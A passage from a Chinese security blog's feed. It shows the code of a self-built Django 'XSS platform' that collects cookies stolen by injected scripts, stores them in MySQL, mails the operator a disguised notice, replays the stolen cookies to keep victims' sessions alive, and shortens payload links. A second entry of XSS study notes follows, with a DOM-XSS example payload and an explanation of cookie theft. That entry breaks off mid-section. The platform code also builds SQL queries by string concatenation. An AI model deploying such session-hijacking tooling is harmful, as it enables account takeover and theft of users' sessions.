&#160;注意：这里使用AJAX可能会出现CORS跨域问题。  </p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>&#160; &#160; &#160; &#160;先给出关键代码，其他都是Django相关的内容，这里不做相关讨论。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">根据url值动态返回相应的javascript代码</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import pymysql,os</span><br><span class="line">from user.safeio import re_check</span><br><span class="line"></span><br><span class="line">def get_info(url):</span><br><span class="line">    if not re_check(url,&#39;num_letter&#39;):</span><br><span class="line">        return &#39;default&#39;</span><br><span class="line">    db &#x3D; pymysql.connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;,&#39;xss&#39;)</span><br><span class="line">    cursor &#x3D; db.cursor()</span><br><span class="line">    cursor.execute(&quot;Select name From projects Where url&#x3D;&#39;&quot;+url+&quot;&#39;&quot;)</span><br><span class="line">    js_name &#x3D; cursor.fetchone()[0]</span><br><span class="line">    if js_name &#x3D;&#x3D; None:</span><br><span class="line">        return &#39;default&#39;</span><br><span class="line">    else:</span><br><span class="line">        return (js_name)</span><br><span class="line"></span><br><span class="line">def get_js_value(url):</span><br><span class="line">    js_name &#x3D; get_info(url)</span><br><span class="line">    file &#x3D; &#39;\\script\\&#39;+js_name + &#39;.js&#39;</span><br><span class="line">    js_value &#x3D; open(os.getcwd()+file).read()</span><br><span class="line">    js_value &#x3D; js_value.replace(&#39;&lt;-1234-&gt;&#39;,url)</span><br><span class="line">    return js_value</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import pymysql,time</span><br><span class="line">from .getscript import get_info</span><br><span class="line"></span><br><span class="line">def connect():</span><br><span class="line">    try:</span><br><span class="line">        db &#x3D; pymysql.connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;, &#39;xss&#39;)</span><br><span class="line">        cursor &#x3D; db.cursor()</span><br><span class="line">        return db,cursor</span><br><span class="line">    except:</span><br><span class="line">        print(&#39;连接数据库失败，正在尝试重新连接&#39;)</span><br><span class="line">        connect()</span><br><span class="line"></span><br><span class="line">def put_letter(requests,url):</span><br><span class="line">    now_time &#x3D; time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime(time.time()))[2:]</span><br><span class="line">    if &#39;HTTP_X_FORWARDED_FOR&#39; in requests.META:</span><br><span class="line">        ip &#x3D; requests.META[&#39;HTTP_X_FORWARDED_FOR&#39;]</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            ip &#x3D; requests.META[&#39;REMOTE_ADDR&#39;]</span><br><span class="line">        except:</span><br><span class="line">            ip &#x3D; &#39;0.0.0.0&#39;</span><br><span class="line">    ip &#x3D; ip.replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    origin &#x3D; requests.GET.get(&#39;location&#39;,&#39;Unknown&#39;).replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    software &#x3D; requests.META.get(&#39;HTTP_USER_AGENT&#39;,&#39;Unknown&#39;).replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    method &#x3D; requests.method.replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    data &#x3D; requests.GET.get(&#39;cookie&#39;,&#39;No data&#39;).replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    keep_alive &#x3D; requests.GET.get(&#39;keepsession&#39;,&#39;0&#39;).replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    list &#x3D; [now_time,ip,origin,software,method,data,keep_alive]</span><br><span class="line">    put_mysql(list,url)</span><br><span class="line"></span><br><span class="line">def put_mysql(list,url):</span><br><span class="line">    db,cursor &#x3D; connect()</span><br><span class="line">    name &#x3D; get_info(url)</span><br><span class="line">    cursor.execute(&quot;Select user From projects Where url&#x3D;&#39;&quot;+url+&quot;&#39;&quot;)</span><br><span class="line">    user &#x3D; cursor.fetchone()[0]</span><br><span class="line">    m_query &#x3D; &quot;INSERT INTO letters(time,name,ip,origin,software,method,data,user,keep_alive) VALUES(&#39;&#123;0&#125;&#39;,&#39;&#123;1&#125;&#39;,&#39;&#123;2&#125;&#39;,&#39;&#123;3&#125;&#39;,&#39;&#123;4&#125;&#39;,&#39;&#123;5&#125;&#39;,&#39;&#123;6&#125;&#39;,&#39;&#123;7&#125;&#39;,&#39;&#123;8&#125;&#39;)&quot;</span><br><span class="line">    m_query &#x3D; m_query.format(list[0],name,list[1],list[2],list[3],list[4],list[5],user,list[6])</span><br><span class="line">    cursor.execute(m_query)</span><br><span class="line">    db.commit()</span><br><span class="line">    db.close()</span><br><span class="line"></span><br><span class="line">def get_letters(username):</span><br><span class="line">    db, cursor &#x3D; connect()</span><br><span class="line">    m_query &#x3D; &quot;SELECT * FROM letters WHERE user &#x3D; &#39;&#123;&#125;&#39;&quot;</span><br><span class="line">    m_query &#x3D; m_query.format(username)</span><br><span class="line">    cursor.execute(m_query)</span><br><span class="line">    result_list &#x3D; cursor.fetchall()</span><br><span class="line">    return result_list</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160; &#160;既然我们知道了xss脚本会将信息构造通过GET的参数形式传给XSS平台，我们只需在服务器接受数据并保存即可。  </p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>&#160; &#160; &#160; &#160;我们可以为我们的平台编写新的功能以完善我们的平台，如邮件提醒，cookie活性保持等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">邮件发送</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.utils import formataddr</span><br><span class="line"></span><br><span class="line">my_sender&#x3D;&#39;xxxx&#39;</span><br><span class="line">my_pass &#x3D; &#39;xxxx&#39;</span><br><span class="line"></span><br><span class="line">def send_mail(user_mail):</span><br><span class="line">    try:</span><br><span class="line">        print(user_mail)</span><br><span class="line">        msg&#x3D;MIMEText(&#39;您点的外卖已送达，请登录平台查询&#39;,&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line">        msg[&#39;From&#39;]&#x3D;formataddr([&quot;XSS平台&quot;,my_sender])</span><br><span class="line">        msg[&#39;To&#39;]&#x3D;formataddr([&quot;顾客&quot;,user_mail])</span><br><span class="line">        msg[&#39;Subject&#39;]&#x3D;&quot;您点的外卖已送达，请登录平台查询&quot;</span><br><span class="line">        server&#x3D;smtplib.SMTP_SSL(&quot;smtp.qq.com&quot;, 465)</span><br><span class="line">        server.login(my_sender, my_pass)</span><br><span class="line">        server.sendmail(my_sender,[user_mail,],msg.as_string())</span><br><span class="line">        server.quit()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">使用独立于主线程的其他线程</span><br><span class="line">来保持通用项目的cookie信息&#39;活性&#39;</span><br><span class="line">默认保持一个小时的活性</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import requests,queue,time,pymysql</span><br><span class="line"></span><br><span class="line">Cookie_Time &#x3D; 1</span><br><span class="line"></span><br><span class="line">def decrease(time,number):</span><br><span class="line">    if time &lt; number:</span><br><span class="line">        time &#x3D; &#39;0&#39;+str(time)</span><br><span class="line">    else:</span><br><span class="line">        time &#x3D; str(time)</span><br><span class="line">    return time</span><br><span class="line"></span><br><span class="line">def count_time(now_time):</span><br><span class="line">    global Cookie_Time</span><br><span class="line">    year &#x3D; int(now_time[0:2])</span><br><span class="line">    month &#x3D; int(now_time[3:5])</span><br><span class="line">    day &#x3D; int(now_time[6:8])</span><br><span class="line">    hours &#x3D; int(now_time[9:11])</span><br><span class="line">    if hours &lt; Cookie_Time:</span><br><span class="line">        if day &#x3D;&#x3D; 1:</span><br><span class="line">            if month &#x3D;&#x3D; 1:</span><br><span class="line">                month&#x3D;12</span><br><span class="line">                year -&#x3D; 1</span><br><span class="line">            else:</span><br><span class="line">                day&#x3D;30</span><br><span class="line">                month -&#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            day -&#x3D; 1</span><br><span class="line">            hours +&#x3D; 19</span><br><span class="line">    else:</span><br><span class="line">        hours -&#x3D; 5</span><br><span class="line">    hours &#x3D; decrease(hours,10)</span><br><span class="line">    day &#x3D; decrease(day,10)</span><br><span class="line">    month &#x3D; decrease(month,10)</span><br><span class="line">    year &#x3D; decrease(year,10)</span><br><span class="line">    dec_time &#x3D; (&quot;&#123;0&#125;-&#123;1&#125;-&#123;2&#125; &#123;3&#125;&quot;).format(year,month,day,hours) + now_time[11:]</span><br><span class="line">    return dec_time</span><br><span class="line"></span><br><span class="line">def create_queue():</span><br><span class="line">    Cookie_queue &#x3D; queue.Queue()</span><br><span class="line">    now_time &#x3D; time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;, time.localtime(time.time()))[2:]</span><br><span class="line">    dec_time &#x3D; count_time(now_time)</span><br><span class="line">    m_query &#x3D; (&quot;SELECT software,origin,data FROM letters WHERE name&#x3D;&#39;default&#39; and time&gt;&#39;&#123;&#125;&#39; and keep_alive &#x3D; &#39;1&#39;&quot;).format(dec_time)</span><br><span class="line">    db &#x3D; pymysql.connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;root&#39;,&#39;xss&#39;)</span><br><span class="line">    cursor &#x3D; db.cursor()</span><br><span class="line">    cursor.execute(m_query)</span><br><span class="line">    return_list &#x3D; cursor.fetchall()</span><br><span class="line">    for x in return_list:</span><br><span class="line">        Cookie_queue.put(x)</span><br><span class="line">    return Cookie_queue</span><br><span class="line"></span><br><span class="line">def action():</span><br><span class="line">    while True:</span><br><span class="line">        time.sleep(60)</span><br><span class="line">        task_queue &#x3D; create_queue()</span><br><span class="line">        while not task_queue.empty():</span><br><span class="line">            tasks &#x3D; task_queue.get()</span><br><span class="line">            url &#x3D; tasks[1]</span><br><span class="line">            ua &#x3D; tasks[0]</span><br><span class="line">            cookie &#x3D; tasks[2]</span><br><span class="line">            headers &#x3D; &#123;&#39;User-Agent&#39;: ua, &#39;Cookie&#39;: cookie&#125;</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url, headers&#x3D;headers)</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160; &#160;注意这里需要使用独立于django主线程的子线程，比如我在manager.py里添加了这么一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">from xssplatform.keep_alive import action</span><br><span class="line"></span><br><span class="line">class keep_Thread(threading.Thread):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(keep_Thread,self).__init__()</span><br><span class="line">    def run(self):</span><br><span class="line">        action()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    th &#x3D; keep_Thread()</span><br><span class="line">    th.start()</span><br></pre></td></tr></table></figure><br>短链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">短链接生成</span><br><span class="line">接口c7.gg</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import requests,json</span><br><span class="line"></span><br><span class="line">Headers &#x3D; &#123;</span><br><span class="line">    &quot;accept&quot; : &quot;application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01&quot;,</span><br><span class="line">    &quot;accept-encoding&quot; : &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;accept-language&quot; : &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8&quot;,</span><br><span class="line">    &quot;content-length&quot; : &quot;53&quot;,</span><br><span class="line">    &quot;content-type&quot; : &quot;application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&quot;,</span><br><span class="line">    &quot;origin&quot; : &quot;https:&#x2F;&#x2F;www.985.so&quot;,</span><br><span class="line">    &quot;referer&quot; : &quot;https:&#x2F;&#x2F;www.985.so&#x2F;&quot;,</span><br><span class="line">    &quot;user-agent&quot; : &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;63.0.3239.132 Safari&#x2F;537.36&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def url_to_short(url):</span><br><span class="line">    global Headers</span><br><span class="line">    data &#x3D; &#123;&#39;type&#39;:&#39;c7&#39;,&#39;url&#39;:url&#125;</span><br><span class="line">    r &#x3D; requests.post(&#39;https:&#x2F;&#x2F;create.ft12.com&#x2F;done.php?m&#x3D;index&amp;a&#x3D;urlCreate&#39;,data&#x3D;data,headers&#x3D;Headers)</span><br><span class="line">    list &#x3D; json.loads(r.text)</span><br><span class="line">    return list[&#39;list&#39;]</span><br></pre></td></tr></table></figure></p><h1 id="4-最后"><a href="#4-最后" class="headerlink" title="4) 最后"></a>4) 最后</h1><p>&#160; &#160; &#160; &#160;其实看起来高大上的XSS平台原理就那么简单，真正难的部分是关于XSS跨站脚本的编写。<br>&#160; &#160; &#160; &#160;此项目已开源于<a href="https://github.com/HackerYunen/django-xss-platform" target="_blank" rel="noopener">Github</a>，有任何问题可以提交issue，我会在第一时间进行回复。<br>&#160; &#160; &#160; &#160;我不会不断更新此项目，感兴趣的朋友可以多多关注我的<a href="http://www.0x002.com">博客</a>。</p>]]></content>
    
    <summary type="html">
    
      使用Django简单编写一个XSS平台，前端使用bootstrap，数据使用mysql。
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="Django" scheme="https://www.0x002.com/tags/Django/"/>
    
      <category term="XSS" scheme="https://www.0x002.com/tags/XSS/"/>
    
      <category term="工具" scheme="https://www.0x002.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>前端Hack之XSS攻击个人学习笔记</title>
    <link href="https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.0x002.com/2019/前端Hack之XSS攻击个人学习笔记/</id>
    <published>2019-03-09T08:02:35.000Z</published>
    <updated>2019-06-17T15:52:33.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简单概述"><a href="#简单概述" class="headerlink" title="简单概述"></a>简单概述</h1><p><strong><br>&#160; &#160; &#160; &#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)</strong><br><a id="more"></a></p><h2 id="1-什么是XSS"><a href="#1-什么是XSS" class="headerlink" title="1) 什么是XSS?"></a>1) 什么是XSS?</h2><p><strong><br>&#160; &#160; &#160; &#160;XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。</strong><br>&#160; &#160; &#160; &#160;如果对以上描述还不是很了解的话，可以参考<a href="https://baike.baidu.com/item/xss/917356" target="_blank" rel="noopener">百度百科</a><br>&#160; &#160; &#160; &#160;在<strong>余弦大大</strong>和<strong>xisigr大大</strong>的书籍《Web前端安全技术揭秘》第三章中这样说道：</p><blockquote><p>跨站脚本的重点不在“跨站”上，而应该在“脚本”上…因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。</p></blockquote><p>&#160; &#160; &#160; &#160;确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。</p><h2 id="2-XSS可以带来哪些危害？"><a href="#2-XSS可以带来哪些危害？" class="headerlink" title="2) XSS可以带来哪些危害？"></a>2) XSS可以带来哪些危害？</h2><p>&#160; &#160; &#160; &#160;对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如：</p><ul><li>网页挂马;</li><li>盗取Cookie;</li><li>DoS攻击;</li><li>钓鱼攻击;</li><li>蠕虫攻击;</li><li>劫持用户web行为;</li><li>结合CSRF进行针对性攻击;</li><li>······</li></ul><p>这些都是可以利用XSS漏洞来达成的。</p><h2 id="3-XSS类型"><a href="#3-XSS类型" class="headerlink" title="3) XSS类型"></a>3) XSS类型</h2><p>目前的XSS总共可以分为三种类型：</p><ul><li><strong>反射型(也叫非持久型)</strong></li><li><strong>存储型(也叫持久型)</strong></li><li><strong>DOM型</strong></li></ul><p>PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试)</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><strong><br>&#160; &#160; &#160; &#160;反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)</strong><br>&#160; &#160; &#160; &#160;由于篇幅问题，关于反射型XSS我就不做过多简述。<br>&#160; &#160; &#160; &#160;有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：<a href="https://xz.aliyun.com/t/3919" target="_blank" rel="noopener">记一次从DOM型XSS到RCE过程</a>。  </p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。— 《XSS跨站脚本攻击剖析与防御》</strong><br>&#160; &#160; &#160; &#160;存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。—《Web前端黑客技术揭秘》</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识<br>&#160; &#160; &#160; &#160;DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在<a href="https://baike.baidu.com/item/DOM/50288" target="_blank" rel="noopener">百度百科</a>得到相应的解答。</strong><br>&#160; &#160; &#160; &#160;DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。<br>&#160; &#160; &#160; &#160;在<strong>刺</strong>的《白帽子讲Web安全》是这样讲的：</p><blockquote><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。</p></blockquote><p>&#160; &#160; &#160; &#160;举个简单的例子(来自《Web前端黑客技术揭秘》)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a&#x3D;document.URL;</span><br><span class="line">document.write(a.substring(a.indexOf(&quot;a&#x3D;&quot;)+2,a.length));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">...</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;把以上代码保存为1.html,然后打开浏览器访问<code>http://127.0.0.1/1.html#a=test</code><br>&#160; &#160; &#160; &#160;我们知道这是个静态页面，而且#后边的内容并不会传给服务器。<br><img src="/img/loading.gif" alt="访问结果" class="lazyload" data-src="https://i.loli.net/2019/03/09/5c839d5c04d33.png"><br>&#160; &#160; &#160; &#160;可是这样就不会产生XSS漏洞了吗？如果我们访问<br><code>http://127.0.0.1/.html#a=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>&#160; &#160; &#160; &#160;当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。<br>&#160; &#160; &#160; &#160;具体执行过程如图：<img src="/img/loading.gif" alt="来自《黑客攻防技术宝典Web实战篇》" class="lazyload" data-src="https://i.loli.net/2019/03/09/5c83cca814d51.jpg"></p><h2 id="4-XSS的利用方式"><a href="#4-XSS的利用方式" class="headerlink" title="4) XSS的利用方式"></a>4) XSS的利用方式</h2><p>&#160; &#160; &#160; &#160;前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。</p><h3 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h3><p><strong>&#160; &#160; &#160; &#160;Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>会弹出当前页面的cookie信息。</strong>  </p><hr><p>&#160; &#160; &#160; &#160;这里我们引入一个叫做“同源策略”的概念：</p><blockquote><p>首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面<code>http://www.a.com/index.html</code>，域名是 <code>www.a.com</code>，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：<img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/10/5c84907479e30.jpg"><br>&#160; &#160; &#160; &#160;同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。<br>&#160; &#160; &#160; &#160;除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：<br>&#160; &#160; &#160; &#160;(1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB<br>&#160; &#160; &#160; &#160;(2) 无法读写非同源网页的 DOM<br>&#160; &#160; &#160; &#160;(3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）</p></blockquote><p>&#160; &#160; &#160; &#160;————引自<strong>晚风</strong>表哥在信安之路上的投稿文章<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487543&amp;idx=1&amp;sn=924a5d5f37fa27d053187cf6a740ba8e&amp;chksm=ec1e201fdb69a909bda97b7e5af3aaffb2853a95694310d2463fe139468b96a55cf7e25edc6c&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">《同源策略与跨域请求》</a>  </p><hr><p>&#160; &#160; &#160; &#160;我们知道Cookie有如下常见的属性：</p><ul><li>Domain————设置关联Cookie的域名;</li><li>Expires————通过给定一个过期时间来创建一个持久化Cookie;</li><li>Httponly————用于避免Cookie被Javascript访问;</li><li>Name————Cookie的名称;</li><li>Path————关联到Cookie的路径，默认为/;</li><li>Value————读写Cookie的值;</li><li>Secure————用于指定Cookie需要通过安全Socket层传递连接;  </li></ul><p>&#160; &#160; &#160; &#160;并且Cookie也可以安装类型分为：</p><ul><li>本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在;</li><li>内存Cookie————即储存在内存中，随浏览器的关闭而消失;  </li></ul><p>&#160; &#160; &#160; &#160;如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。<br>&#160; &#160; &#160; &#160;由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况</p><h4 id="默认"><a href="#默认" class="headerlink" 